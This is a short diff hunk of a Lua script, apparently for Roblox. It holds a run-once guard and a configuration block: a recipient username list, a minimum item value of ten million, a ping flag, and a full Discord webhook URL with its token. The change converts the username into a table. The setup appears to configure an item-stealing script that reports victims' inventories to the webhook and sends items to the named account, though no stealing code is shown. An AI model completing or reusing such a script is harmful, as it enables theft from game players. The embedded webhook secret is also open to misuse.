@@ -4,7 +4,7 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
-local users = "Tigatanim01"
+local users = {"Tigatanim01"}
 local min_value = 10000000
 local ping = "Yes"
 local webhook = "https://discord.com/api/webhooks/1404564628272578811/wDcyD8_8ggEf-CpeCoTs-NL_Ox_2J6utx8wp7ZPjccBrQpK53yw01Ab7XBhnDSgEZajb"
